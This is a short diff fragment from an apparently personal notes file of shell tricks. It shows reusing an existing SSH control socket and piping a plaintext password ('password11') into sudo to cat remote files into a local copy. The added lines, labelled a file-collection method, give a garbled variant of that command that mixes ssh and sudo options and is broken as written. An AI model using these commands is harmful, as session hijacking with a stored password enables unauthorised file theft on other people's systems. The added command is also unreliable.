@@ -9,6 +9,8 @@ ssh -S /tmp/T# \| sudo --prompt="" -S -- cat <file> > <where you want file /name
 > password11
 > EOF
 
+ethans gansgast file collect method
+ssh -S /tmp/T1 dummy --prompt="sudo -S cat /file/cat" > /where 
 
 ============================================================================================
 ============================================================================================
